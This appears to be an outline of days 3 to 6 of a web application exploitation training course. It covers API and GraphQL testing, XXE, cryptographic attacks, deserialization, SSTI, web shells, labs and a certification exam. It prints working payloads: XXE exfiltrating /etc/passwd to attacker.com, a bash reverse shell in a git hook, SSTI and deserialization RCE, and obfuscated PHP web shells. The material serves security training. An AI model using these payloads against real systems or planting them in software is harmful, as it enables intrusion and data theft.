# Days 3-6: Course Overview & Key Content

This document provides an overview of the remaining training days with key topics, attack techniques, and lab exercises.

---

## DAY 3: API Security & XXE Attacks

### Module 5: API Penetration Testing (2 hours)

#### REST API Security Testing

**Common Vulnerabilities:**
- Missing authentication/authorization
- Excessive data exposure
- Mass assignment
- Security misconfiguration
- Injection flaws

**Testing Checklist:**
```bash
# 1. API Discovery
- Enumerate endpoints from JavaScript files
- Check /api/v1, /api/v2, /api/internal
- Look for Swagger/OpenAPI docs (/swagger.json, /api-docs)

# 2. Authentication Testing
- Test endpoints without authentication
- Try expired/invalid tokens
- Test token reuse across accounts

# 3. Authorization Testing
- IDOR: Change user IDs, resource IDs
- Test different HTTP methods (GET, POST, PUT, DELETE, PATCH)
- Privilege escalation tests

# 4. Rate Limiting
- Brute-force attempts
- Resource exhaustion

# 5. Input Validation
- Injection attacks (SQL, NoSQL, Command)
- XXE, SSRF in API inputs
- Type confusion attacks
```

**REST API Attack Examples:**

```bash
# IDOR in REST
GET /api/v1/users/123/orders → Change to /api/v1/users/124/orders

# HTTP Method Tampering
POST /api/users/123 (update) → Forbidden
PUT /api/users/123 (same operation) → Success!

# API Versioning Exploitation
GET /api/v2/admin/users → 403 Forbidden
GET /api/v1/admin/users → 200 OK (old version, less secure!)

# Parameter Pollution
GET /api/data?user_id=attacker&user_id=victim

# Mass Assignment
POST /api/users
{"username": "test", "email": "test@ex.com", "is_admin": true}
```

#### GraphQL Security

**GraphQL Vulnerabilities:**

1. **Introspection Query (Information Disclosure)**
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

2. **Deep Nested Queries (DoS)**
```graphql
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... nested infinitely
                }
              }
            }
          }
        }
      }
    }
  }
}
```

3. **Field Suggestions**
```graphql
query {
  user {
    idd  # Typo
  }
}

# Error response may suggest:
# "Did you mean 'id', 'isAdmin', 'isVerified'?"
# Reveals hidden fields!
```

4. **Batch Attacks**
```graphql
query {
  user1: user(id: 1) { email, ssn }
  user2: user(id: 2) { email, ssn }
  user3: user(id: 3) { email, ssn }
  # ... repeat for 1000 users
}
```

**GraphQL Testing Tools:**
```bash
# GraphQL Voyager - Visualize schema
# InQL Scanner - Burp extension
# GraphQL Playground

# Manual testing
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

#### gRPC Security

**gRPC Testing:**
```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services
grpcurl -plaintext target.com:50051 list

# Describe service
grpcurl -plaintext target.com:50051 describe UserService

# Call method
grpcurl -plaintext -d '{"user_id": 123}' \
  target.com:50051 UserService/GetUser

# Test authorization
grpcurl -plaintext -d '{"user_id": 999}' \
  -H 'Authorization: Bearer TOKEN' \
  target.com:50051 AdminService/DeleteUser
```

---

### Module 6: XML External Entity (XXE) Attacks (2 hours)

#### XXE Basics

**What is XXE?**
XML External Entity injection allows attackers to interfere with XML processing.

**Basic XXE Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>
```

**File Read Attack:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Expected Response:**
```xml
<response>
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
</response>
```

#### Advanced XXE - Out-of-Band (OOB) Attacks

**When direct XXE doesn't work (no output):**

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**Flow:**
1. Target fetches evil.dtd from attacker server
2. Target reads /etc/passwd
3. Target sends content to attacker.com/?data=...
4. Attacker receives file contents in HTTP logs

#### XXE via SAML

**SAML XXE Attack:**
```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="username">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

#### XXE in File Upload

**SVG File Upload XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**DOCX File XXE:**
```bash
# DOCX is a ZIP file containing XML
unzip document.docx
cd word

# Edit document.xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfiltrate">
]>
<w:document>
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>

# Rezip
zip -r malicious.docx *
```

#### XXE Prevention

```python
# Python lxml - Secure parser
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    no_network=True,         # Disable network access
    dtd_validation=False,    # Disable DTD validation
    load_dtd=False          # Don't load external DTDs
)

tree = etree.parse(xml_file, parser)
```

---

### Lab 3: API + XXE Exploitation

**Scenario:** E-commerce API with XML export functionality

**Tasks:**
1. Enumerate GraphQL schema
2. Find IDOR in REST API
3. Exploit XXE in XML export feature
4. Chain vulnerabilities for data exfiltration

**Deliverables:**
- API endpoint map
- GraphQL schema dump
- XXE PoC reading /etc/passwd
- OOB XXE exfiltrating database credentials

---

## DAY 4: Cryptography & RCE Exploits

### Module 7: Cryptography Exploitation (2 hours)

#### Known Plaintext Attack

**ECB Mode Weakness:**
```python
# ECB mode encrypts identical plaintext blocks to identical ciphertext
# Can detect patterns and craft attacks

import base64

# If you know: plaintext "A"*16 → ciphertext_block_A
# And: "AAAAAAAAAAAAAAAA" in encrypted data
# You can identify and replace those blocks

# Example: Cookie encryption
# cookie = encrypt("user=attacker;role=user")
# Known: "role=user" encrypts to specific block
# Craft: "user=admin" block
# Replace: swap blocks to get admin role
```

#### Padding Oracle Attack

**Concept:** Server behavior reveals padding validity

**Attack Flow:**
```
1. Intercept encrypted data
2. Modify ciphertext bytes
3. Send to server
4. Observe response:
   - "Padding error" → invalid padding
   - "Decryption error" → valid padding, invalid data
5. Use oracle to decrypt byte-by-byte
```

**Tools:**
```bash
# PadBuster
./padbuster.py http://target.com/login ENCRYPTED_COOKIE 8 \
  -cookies "auth=ENCRYPTED_COOKIE"

# Poracle (Padding Oracle Attack Tool)
python3 poracle.py -c CIPHERTEXT -u http://target.com/api
```

#### Hash Length Extension Attack

**Vulnerable Code:**
```python
# Server generates signature
secret = "mysecret"
data = "user=alice&admin=false"
signature = hashlib.sha256(secret + data).hexdigest()

# Sends: data + signature to client
# Client can extend data without knowing secret!
```

**Attack:**
```bash
# Using hash_extender
./hash_extender \
  --data 'user=alice&admin=false' \
  --secret-length 8 \
  --append '&admin=true' \
  --signature KNOWN_SIGNATURE \
  --format sha256

# Generates new valid signature for extended data
```

#### .NET Machine Key Authentication Bypass

**ViewState Exploitation:**
```
# If machine key is known or weak
# Can forge ViewState and execute code

ysoserial.net -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell.exe -c calc.exe" \
  --path="/default.aspx" \
  --apppath="/" \
  --validationalg="SHA1" \
  --validationkey="KNOWN_KEY"
```

---

### Module 8: Remote Code Execution (2 hours)

#### PHP Deserialization

**Vulnerable Code:**
```php
<?php
$data = unserialize($_COOKIE['user']);
?>
```

**Exploit:**
```php
class User {
    public $username;
    public $isAdmin = false;

    function __destruct() {
        // Dangerous code executed during deserialization
        if ($this->isAdmin) {
            system($this->username);  // RCE!
        }
    }
}

// Create malicious object
$exploit = new User();
$exploit->username = "whoami";
$exploit->isAdmin = true;

// Serialize and send
$payload = serialize($exploit);
// Send as cookie: user=$payload
```

**Tools:**
```bash
# PHPGGC - PHP Generic Gadget Chains
./phpggc -l  # List available gadgets
./phpggc Laravel/RCE1 'system' 'whoami'
```

#### Java Deserialization

**ysoserial:**
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'calc.exe' > payload.bin

# Send in HTTP request
curl http://target.com/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

#### Python Pickle Deserialization

**Exploit:**
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Send payload to vulnerable endpoint
```

#### Git Configuration Exploitation

**Exposed .git Directory:**
```bash
# Download git repository
./git-dumper.py http://target.com/.git /output/dir

# Extract source code
cd /output/dir
git checkout -- .

# Search for secrets
git log --all --oneline
git show <commit-hash>
grep -r "password\|secret\|key" .
```

**Git Hooks RCE:**
```bash
# If can upload to .git/hooks/
# Create post-receive hook
#!/bin/sh
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Make executable
chmod +x .git/hooks/post-receive

# Trigger by pushing to repo
```

#### Server-Side Template Injection (SSTI)

**Detection:**
```
# Test payloads
{{7*7}}        # Jinja2, Twig
${7*7}         # FreeMarker, Velocity
<%= 7*7 %>     # ERB
#{7*7}         # Thymeleaf
```

**Jinja2 RCE:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

**Twig RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

**Detection & Exploitation Tools:**
```bash
# tplmap
python tplmap.py -u 'http://target.com/page?name=test'

# SSTImap
python sstimap.py -u 'http://target.com/page?name=test'
```

---

### Lab 4: Crypto to RCE

**Scenario:** Web application with encrypted cookies and file upload

**Tasks:**
1. Identify padding oracle vulnerability
2. Decrypt and modify cookie
3. Exploit deserialization in file upload
4. Achieve RCE
5. Extract flag from server

**Deliverables:**
- Decrypted cookie content
- Forged admin cookie
- RCE payload
- Shell access screenshot
- Flag captured

---

## DAY 5: Capstone Assessment

### Full-Day Black-Box Assessment

**Environment:** Realistic web application with multiple vulnerabilities

**Objectives:**
- Reconnaissance & mapping
- Identify authentication bypass
- Exploit business logic flaw
- API vulnerability exploitation
- Achieve RCE

**Attack Chain Example:**
```
1. Recon → Find GraphQL endpoint
2. GraphQL introspection → Discover admin API
3. JWT algorithm confusion → Forge admin token
4. Access admin panel → Find file upload
5. SSTI in filename → RCE
6. Post-exploitation → Extract database
```

### Malware-in-WebApps Primer (30 min)

**Web Shells:**
```php
// Simple PHP webshell
<?php system($_GET['cmd']); ?>

// Obfuscated
<?php @eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

// China Chopper
<?php @eval($_POST['password']); ?>
```

**Detection Evasion:**
- File splitting
- Encoding/encryption
- Steganography
- Polyglot files

### Red-Team Reporting (45 min)

**Report Structure:**
1. Executive Summary
2. Scope & Methodology
3. Findings (by severity)
4. Attack Chains
5. Impact Assessment
6. Remediation Recommendations
7. Appendix (Technical Details)

**Deliverable:** Professional penetration test report

---

## DAY 6: Certification Exam

### Exam Structure

**Part 1: Theory (25 min, 20%)**
- Multiple choice questions
- Short answer questions
- Vulnerability identification
- Security concepts

**Part 2: Practical A (90 min, 35%)**
- Exploit 5 specific vulnerabilities
- JWT bypass
- IDOR exploitation
- XXE attack
- Race condition
- SSTI/Deserialization

**Part 3: Practical B (75 min, 25%)**
- Mini capstone
- Chain 3+ vulnerabilities
- Achieve admin access
- Extract sensitive data
- Write 1-page risk summary

**Part 4: Defense Presentation (40 min, 20%)**
- Present findings
- Explain attack chain
- Justify severity ratings
- Recommend mitigations
- Q&A with instructor

### Passing Criteria

- Overall score: ≥70%
- Must complete at least 3/5 Practical A tasks
- Must successfully chain vulnerabilities in Practical B
- Professional presentation in Part 4

### Certificate

Upon successful completion:
- **Certificate:** Advanced Web Application Exploitation Specialist
- **Badge:** Digital credential for LinkedIn
- **CPE Credits:** 48 hours

---

## Additional Resources

### Recommended Tools

**Reconnaissance:**
- subfinder, amass, assetfinder
- ffuf, gobuster, feroxbuster
- nuclei

**Interception:**
- Burp Suite Professional
- OWASP ZAP
- Caido

**Exploitation:**
- jwt_tool
- sqlmap
- XXEinjector
- ysoserial
- PHPGGC

**Automation:**
- Python requests library
- Custom scripts
- Turbo Intruder

### Further Learning

- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports
- Bug Bounty Platforms (HackerOne, Bugcrowd)
- CTF Platforms (HackTheBox, TryHackMe)

### References

- OWASP Top 10
- SANS Top 25
- CWE Database
- CVE Details
- Security research blogs

---

## Instructor Final Notes

### Success Metrics

Track student performance on:
- Lab completion rates
- Vulnerability discovery
- Exploit development
- Documentation quality
- Presentation skills

### Post-Training

- Provide certificate within 1 week
- Share additional resources
- Offer alumni network access
- Quarterly advanced workshops
- Job placement support

### Continuous Improvement

- Collect feedback daily
- Update vulnerable apps
- Refresh case studies
- Add new attack techniques
- Industry alignment

---

**End of Training Overview**
